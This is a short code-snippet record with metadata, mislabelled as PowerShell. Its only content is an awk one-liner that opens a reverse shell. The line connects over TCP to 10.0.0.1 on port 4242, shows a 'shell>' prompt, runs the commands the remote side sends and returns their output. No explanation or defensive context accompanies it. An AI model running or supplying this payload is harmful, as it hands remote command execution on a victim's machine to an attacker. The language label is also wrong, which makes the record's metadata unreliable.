---
id: e32b10ed-0ff7-4921-85c6-4c92b6401ab6
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.507744+00:00'
updated_at: '2023-04-10T20:25:25.253716+00:00'
---

# Code Snippet e32b10ed

**Language**: Powershell

```powershell
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
